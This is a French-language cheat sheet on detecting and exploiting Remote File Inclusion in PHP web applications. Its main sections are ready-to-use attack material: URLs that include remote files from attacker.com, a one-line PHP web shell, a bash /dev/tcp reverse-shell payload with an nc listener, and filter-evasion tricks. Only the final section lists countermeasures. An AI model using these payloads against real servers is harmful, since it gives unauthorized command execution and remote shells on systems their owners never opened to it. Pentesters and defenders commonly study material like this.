# 🌐 RFI (Remote File Inclusion) - Cheatsheet Cyber

Ce fichier fournit une vue d’ensemble claire pour détecter et exploiter une **Remote File Inclusion**, vulnérabilité fréquente dans les applications web mal sécurisées, notamment en PHP.

---

## ❓ 1. Qu’est-ce qu’une RFI ?

Une **Remote File Inclusion** permet à un attaquant d'inclure un **fichier distant** dans le script du serveur web, généralement via un paramètre vulnérable dans l’URL.

Exemple typique :

page=contact.php  
> devient vulnérable si utilisé comme : `include($_GET['page']);`

---

## 🔍 2. Étapes pour détecter une RFI

### Identifier les paramètres sensibles

Chercher des paramètres dans l’URL comme :

?file=  
?page=  
?lang=  
?view=  

> S’ils sont utilisés dans un `include`, `require`, `fopen`, `file_get_contents`, etc., ils peuvent être vulnérables

### Tester avec des chemins externes

Essayer d’inclure une URL :

?page=http://attacker.com/shell.txt  
> Si la page charge le contenu distant, c’est vulnérable

---

## 🧪 3. Payloads de test

http://target.com/index.php?page=http://attacker.com/cmd.txt  
> Inclus et exécute un script distant

http://target.com/index.php?page=php://input  
> Exploitation locale avec un payload POST (LFI/RFI combo)

http://target.com/index.php?page=//attacker.com/shell  
> Certains serveurs permettent `//` pour ignorer validations

---

## 💣 4. Exploitation RFI

### Script de commande PHP (cmd.txt)

<?php system($_GET["cmd"]); ?>  
> Uploadé sur ton serveur (attacker.com)

http://target.com/index.php?page=http://attacker.com/cmd.txt&cmd=whoami  
> Commande exécutée sur la machine cible

---

## 🧠 5. Techniques d’évasion

- Encodage double : %252e%252e%252f  
- Manipulation via null byte (obsolète mais utile sur anciens PHP)
- Changer l’extension du fichier `.txt` vers `.php.txt`

---

## 🔐 6. RFI vers Reverse Shell

Créer un fichier `shell.txt` sur ton serveur contenant :

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); ?>  

Inclure via :

http://target.com/index.php?page=http://yourserver.com/shell.txt  
> Et écouter avec : `nc -lvnp PORT`

---

## 🛡 7. Contre-mesures

- Désactiver `allow_url_include` et `allow_url_fopen` dans `php.ini`
- Ne jamais inclure de fichier depuis une entrée utilisateur
- Whitelister les chemins et noms de fichiers autorisés
- Utiliser des chemins absolus / constants

---

## 📌 Ressources utiles

- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [OWASP - RFI](https://owasp.org/www-community/attacks/Remote_File_Inclusion)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---
